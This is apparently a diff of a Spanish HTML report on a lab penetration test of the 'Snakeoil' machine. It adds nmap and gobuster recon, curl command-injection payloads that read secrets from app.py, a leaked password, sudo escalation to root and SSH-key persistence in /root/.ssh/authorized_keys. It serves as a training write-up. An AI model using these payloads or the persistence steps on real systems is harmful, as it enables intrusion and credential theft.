@@ -26,7 +26,6 @@
 
         <main class="luxury-main">
 
-            <!-- ========== DESCARGA DEL INFORME PDF ========== -->
             <section class="evidence-card" style="text-align: center; border-left: 4px solid var(--accent-dark);">
                 <div class="card-number">PDF</div>
                 <h3>Documentación Completa</h3>
@@ -40,7 +39,6 @@
                 </a>
             </section>
 
-            <!-- ========== OBJETIVO ========== -->
             <section class="evidence-card">
                 <div class="card-number">01</div>
                 <h3>Objetivo de la Práctica</h3>
@@ -54,7 +52,6 @@
                 </p>
             </section>
 
-            <!-- ========== DESARROLLO ========== -->
             <section class="evidence-card">
                 <div class="card-number">02</div>
                 <h3>Desarrollo</h3>
@@ -64,24 +61,69 @@
                     enumeración, explotación y post-explotación sobre la máquina Snakeoil.
                 </p>
 
-                <h4>Fases realizadas:</h4>
-                <ul>
-                    <li><strong>Reconocimiento:</strong> Descubrimiento de la IP y escaneo de puertos con nmap y arp-scan.</li>
-                    <li><strong>Enumeración:</strong> Análisis de los servicios web en los puertos 80 y 8080, descubrimiento de endpoints con Gobuster.</li>
-                    <li><strong>Explotación:</strong> Registro de usuario, obtención de JWT, extracción de secret_key y explotación de Command Injection en el endpoint /run.</li>
-                    <li><strong>Acceso inicial:</strong> SSH como usuario patrick utilizando la contraseña encontrada en app.py.</li>
-                    <li><strong>Escalada de privilegios:</strong> Uso de sudo (ALL:ALL) para obtener shell de root.</li>
-                    <li><strong>Post-explotación:</strong> Demostración de control del sistema y establecimiento de persistencia mediante llave SSH.</li>
-                </ul>
+                <h4>Fase de Preparación y Reconocimiento</h4>
+                <p>Se configuró el entorno en red Host-Only y se identificó la máquina objetivo.</p>
+                <pre><code>sudo arp-scan -l
+nmap -sV -p 22,80,8080 192.168.56.100 192.168.56.103
+nmap -sC -sV -p- -T4 -oA snakeoil_full 192.168.56.103</code></pre>
+                <p>Estos comandos permitieron descubrir la IP de la víctima (192.168.56.103) y confirmar los servicios abiertos: SSH (22), HTTP (80) y la aplicación Flask (8080).</p>
 
-                <h4>Comandos principales utilizados:</h4>
-                <pre><code>
-<!-- Aquí vamos a poner los comandos cuando me los pases -->
-                </code></pre>
+                <h4>Enumeración Web</h4>
+                <pre><code>gobuster dir -u http://192.168.56.103:8080 -w /usr/share/wordlists/dirb/common.txt -t 40</code></pre>
+                <p>Se descubrieron endpoints interesantes como /users, /registration, /login, /run y /secret.</p>
 
+                <h4>Fase de Explotación</h4>
+                <p>Se registró un usuario y se obtuvo un token JWT:</p>
+                <pre><code>curl -X POST http://192.168.56.103:8080/registration -d "username=hacker&password=hacker123"
+curl -X POST http://192.168.56.103:8080/login -d "username=hacker&password=hacker123"</code></pre>
+
+                <p>Con el token se obtuvo la secret_key:</p>
+                <pre><code>curl http://192.168.56.103:8080/secret -H "Cookie: access_token_cookie=TOKEN_AQUI"</code></pre>
+
+                <p>Se explotó Command Injection en el endpoint /run:</p>
+                <pre><code>curl -X POST http://192.168.56.103:8080/run \
+  -H "Content-Type: application/json" \
+  -d '{"url":"127.0.0.1:80`id`","secret_key":"commandexecutionissecret"}'
+
+curl -X POST http://192.168.56.103:8080/run \
+  -H "Content-Type: application/json" \
+  -d '{"url":"127.0.0.1:80`grep -E "SECRET_KEY|PASSWORD|password|JWT" /home/patrick/flask_blog/app.py`","secret_key":"commandexecutionissecret"}'</code></pre>
+                <p>Se extrajo la contraseña del usuario patrick: <strong>NOreasonableDOUBTthisPASSWORDisGOOD</strong></p>
+
+                <h4>Acceso Inicial y Escalada de Privilegios</h4>
+                <pre><code>ssh patrick@192.168.56.103
+whoami
+id
+cat ~/local.txt
+sudo -l
+sudo su -
+whoami
+id
+cat /root/proof.txt</code></pre>
+                <p>Se obtuvo acceso como patrick y posteriormente se escaló a root gracias a los privilegios sudo (ALL:ALL).</p>
+
+                <h4>Fase de Post-Explotación</h4>
+                <p>Se demostró control del sistema y se estableció persistencia:</p>
+                <pre><code>uname -a
+hostname
+
+# En Kali
+ssh-keygen -t ed25519 -f snakeoil_root -N ""
+cat snakeoil_root.pub
+
+# En la máquina objetivo (como root)
+mkdir -p /root/.ssh
+echo "CLAVE_PUBLICA" >> /root/.ssh/authorized_keys
+chmod 700 /root/.ssh
+chmod 600 /root/.ssh/authorized_keys
+
+# Verificación desde Kali
+ssh -i snakeoil_root root@192.168.56.103
+whoami
+id
+cat /root/proof.txt</code></pre>
             </section>
 
-            <!-- ========== CONCLUSIONES ========== -->
             <section class="evidence-card">
                 <div class="card-number">03</div>
                 <h3>Conclusiones</h3>
@@ -100,7 +142,6 @@
                 </p>
             </section>
 
-            <!-- ========== VIDEO (lo agregaremos después) ========== -->
             <!-- 
             <section class="evidence-card">
                 <div class="card-number">VIDEO</div>
